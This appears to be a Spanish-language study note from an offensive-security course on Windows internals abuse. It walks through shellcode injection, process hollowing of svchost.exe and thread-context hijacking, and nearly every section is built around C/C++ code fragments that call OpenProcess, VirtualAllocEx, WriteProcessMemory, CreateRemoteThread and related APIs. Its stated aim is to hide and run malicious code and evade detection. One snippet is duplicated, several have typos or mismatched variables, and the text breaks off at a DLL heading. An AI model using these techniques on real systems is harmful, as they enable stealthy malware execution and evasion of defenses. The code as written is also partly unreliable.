# Introducción

Windows Internal es el core de todas las funciones de Windows, esto da grandes vectores para un uso lucrativo. Windows Internals se puede usar para esconder y ejecutar código, evadir detecciones, y otras tecnicas y exploits

# Objetivos de aprendizaje

- Entender como los componentes pueden ser vulnerables
- Aprender como se abusa y explota las vulnerabilidades de Windows Internals
- Entender las mitifaciones y detceiones de las técnicas
- Aplicar técnicas para aprender el mundo real

# Procesos Abusables

LAs aplicacioens que corren en el sistema operativo tienen uno o más procesos. Procesos mantienen y representan un probrama que ha sido ejecutado

Procesos tienen otros sub-componentes y interactuan directamente con la memoria virutal, haciendo un candidato perfecto.

![image](https://github.com/user-attachments/assets/937e982f-020b-4876-939c-f376da7d8bef)

La injección de procesos se usa normalmente como un término para describir un código malicioso o un proceso que no tiene la funcionalidad y los componentes légitimos, vamos a centrarnos en los diferentes tipos de injección de proceso

![image](https://github.com/user-attachments/assets/2ddf0afe-c3ef-401b-89c1-c9403c225c63)

En el nivel más básico, la injección de proceso es la forma de injectar una shell

En alto nivel, la injección de shell se puede dividir en 4 partes:

1. Abrir un proceso con todos los accesos
2. Ajogar el shellcode en la memoria del proceso
3. Escribir el shellcode alojado en la memoria en el proceso
4. Ejecutar el shellcode

![image](https://github.com/user-attachments/assets/24aa3269-24ef-4744-998e-9e9fe4136e54)

Paso uno, necesitamos abrir el proceso y usar parametros especiales, "OpenProcess" se usa para abrir un proceso vía comando

```
processHandle = OpenProcess(
	PROCESS_ALL_ACCESS, // Defines access rights
	FALSE, // Target handle will not be inhereted
	DWORD(atoi(argv[1])) // Local process supplied by command-line arguments 
);
```

En el segundo paso, deberemos alojar la memoria en el lugar de byes. "VirtualAllocEx" con el parametro "dwSizze" usando "siezeof"

```
remoteBuffer = VirtualAllocEx(
	processHandle, // Opened target process
	NULL, 
	sizeof shellcode, // Region size of memory allocation
	(MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
);
```

En el paso 3, deberemos usar la memoria que acabamos de alogar apra escribir la shellcode. "WriteProcessMemory" 

```
WriteProcessMemory(
	processHandle, // Opened target process
	remoteBuffer, // Allocated memory region
	shellcode, // Data to write
	sizeof shellcode, // byte size of data
	NULL
);
```

En el 4 paso, deberemos tener control del proceso y de nuestra código malicioso. PArar ejecutar el shellcode en memoria usaremos "CreateRemoteThread"

```
remoteThread = CreateRemoteThread(
	processHandle, // Opened target process
	NULL, 
	0, // Default size of the stack
	(LPTHREAD_START_ROUTINE)remoteBuffer, // Pointer to the starting address of the thread
	NULL, 
	0, // Ran immediately after creation
	NULL
);
```

# Expandir el abuso del proceso

Esta técnica ofrece una injección a un código malicioso dentro de un proceso. "holowwing"

1. Crear un process target en un estado suspendido
2. Abrir una imagen maliciosa
3. Un-Map el código legitimo
4. Alojar la memoria con el código malicioso
5. Entrar con el código maliocoso
6. Quitar el target como estado suspendido

![image](https://github.com/user-attachments/assets/5e05fad4-e11e-4c9b-a150-0bd1f492ae09)

```
LPSTARTUPINFOA target_si = new STARTUPINFOA(); // Defines station, desktop, handles, and appearance of a process
LPPROCESS_INFORMATION target_pi = new PROCESS_INFORMATION(); // Information about the process and primary thread
CONTEXT c; // Context structure pointer

if (CreateProcessA(
	(LPSTR)"C:\\\\Windows\\\\System32\\\\svchost.exe", // Name of module to execute
	NULL,
	NULL,
	NULL,
	TRUE, // Handles are inherited from the calling process
	CREATE_SUSPENDED, // New process is suspended
	NULL,
	NULL,
	target_si, // pointer to startup info
	target_pi) == 0) { // pointer to process information
	cout << "[!] Failed to create Target process. Last Error: " << GetLastError();
	return 1;
```
```
LPSTARTUPINFOA target_si = new STARTUPINFOA(); // Defines station, desktop, handles, and appearance of a process
LPPROCESS_INFORMATION target_pi = new PROCESS_INFORMATION(); // Information about the process and primary thread
CONTEXT c; // Context structure pointer

if (CreateProcessA(
	(LPSTR)"C:\\\\Windows\\\\System32\\\\svchost.exe", // Name of module to execute
	NULL,
	NULL,
	NULL,
	TRUE, // Handles are inherited from the calling process
	CREATE_SUSPENDED, // New process is suspended
	NULL,
	NULL,
	target_si, // pointer to startup info
	target_pi) == 0) { // pointer to process information
	cout << "[!] Failed to create Target process. Last Error: " << GetLastError();
	return 1;
```
```
DWORD maliciousFileSize = GetFileSize(
	hMaliciousCode, // Handle of malicious image
	0 // Returns no error
);

PVOID pMaliciousImage = VirtualAlloc(
	NULL,
	maliciousFileSize, // File size of malicious image
	0x3000, // Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)
	0x04 // Enables read/write access (PAGE_READWRITE)
);
```
```
DWORD numberOfBytesRead; // Stores number of bytes read

if (!ReadFile(
	hMaliciousCode, // Handle of malicious image
	pMaliciousImage, // Allocated region of memory
	maliciousFileSize, // File size of malicious image
	&numberOfBytesRead, // Number of bytes read
	NULL
	)) {
	cout << "[!] Unable to read Malicious file into memory. Error: " <<GetLastError()<< endl;
	TerminateProcess(target_pi->hProcess, 0);
	return 1;
}

CloseHandle(hMaliciousCode);
```

# Abusar el proceso de los componentes

Una ejecicón de hijacking en alto nivel tiene estos pasos

1. Localizar el proceso a controlar
2. Alojar la región de memoria con código malicioso
3. Escribir el código malicoso en la region
4. Identificar el ID del target
5. Abrir el target
6. Suspenderlo
7. OBtener el contex
8. Actualizar la instrucción apuntando a nuestro código
9. Reescribir el contexto
10. Resumen

```
HANDLE hProcess = OpenProcess(
	PROCESS_ALL_ACCESS, // Requests all possible access rights
	FALSE, // Child processes do not inheret parent process handle
	processId // Stored process ID
);
PVOIF remoteBuffer = VirtualAllocEx(
	hProcess, // Opened target process
	NULL, 
	sizeof shellcode, // Region size of memory allocation
	(MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
);
WriteProcessMemory(
	processHandle, // Opened target process
	remoteBuffer, // Allocated memory region
	shellcode, // Data to write
	sizeof shellcode, // byte size of data
	NULL
);
```
```
THREADENTRY32 threadEntry;

HANDLE hSnapshot = CreateToolhelp32Snapshot( // Snapshot the specificed process
	TH32CS_SNAPTHREAD, // Include all processes residing on the system
	0 // Indicates the current process
);
Thread32First( // Obtains the first thread in the snapshot
	hSnapshot, // Handle of the snapshot
	&threadEntry // Pointer to the THREADENTRY32 structure
);

while (Thread32Next( // Obtains the next thread in the snapshot
	snapshot, // Handle of the snapshot
	&threadEntry // Pointer to the THREADENTRY32 structure
)) {
```
```
if (threadEntry.th32OwnerProcessID == processID) // Verifies both parent process ID's match
		{
			HANDLE hThread = OpenThread(
				THREAD_ALL_ACCESS, // Requests all possible access rights
				FALSE, // Child threads do not inheret parent thread handle
				threadEntry.th32ThreadID // Reads the thread ID from the THREADENTRY32 structure pointer
			);
			break;
		}
```
```
SuspendThread(hThread);
```
```
CONTEXT context;
GetThreadContext(
	hThread, // Handle for the thread 
	&context // Pointer to store the context structure
);
```

# Abusar DLls

